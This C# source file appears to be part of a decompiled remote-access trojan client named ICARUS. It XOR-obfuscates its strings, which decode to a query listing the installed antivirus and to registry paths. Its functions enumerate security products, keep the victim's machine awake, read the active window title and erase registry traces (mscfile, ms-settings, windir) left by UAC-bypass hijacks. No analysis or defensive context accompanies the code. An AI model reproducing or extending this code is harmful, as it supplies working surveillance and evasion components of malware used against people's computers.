using System;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

namespace Peg.ICARUS
{
	public static class Me8odos
	{
		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		public static void ClientOnExit()
		{
			try
			{
				if (Convert.ToBoolean(Settings.ODBS) && IsAdmin())
				{
					Prostasia.Exit();
				}
				MutexControl.CloseMutex();
				PegSock.SslClient?.Close();
				PegSock.TcpClient?.Close();
			}
			catch
			{
			}
		}

		public static string Antivirus()
		{
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", thebook("Yofoi~* *lxeg*Kd~c|cx\u007fyZxen\u007fi~")))
				{
					foreach (ManagementObject item in managementObjectSearcher.Get())
					{
						text = text + item["displayName"]?.ToString() + "; ";
					}
				}
				text = RemoveLastChars(text);
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string thebook(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		public static string RemoveLastChars(string input, int amount = 2)
		{
			if (input.Length > amount)
			{
				input = input.Remove(input.Length - amount);
			}
			return input;
		}

		public static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
			foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern Askhshs.EXECUTION_STATE SetThreadExecutionState(Askhshs.EXECUTION_STATE esFlags);

		public static void PreventSleep()
		{
			try
			{
				SetThreadExecutionState((Askhshs.EXECUTION_STATE)2147483651u);
			}
			catch
			{
			}
		}

		public static string GetActiveWindowTitle()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (Askhshs.GetWindowText(Askhshs.GetForegroundWindow(), stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}

		public static void ClearSetting()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Environment");
				if (registryKey.GetValue("windir") != null)
				{
					registryKey.DeleteValue("windir");
				}
				registryKey.Close();
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey(thebook("Yel~}kxo"), writable: true).OpenSubKey(thebook("Ifkyyoy"), writable: true).DeleteSubKeyTree(thebook("gyilcfo"));
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey(thebook("Yel~}kxo"), writable: true).OpenSubKey(thebook("Ifkyyoy"), writable: true).DeleteSubKeyTree(thebook("gy'yo~~cdmy"));
			}
			catch
			{
			}
		}
	}
}
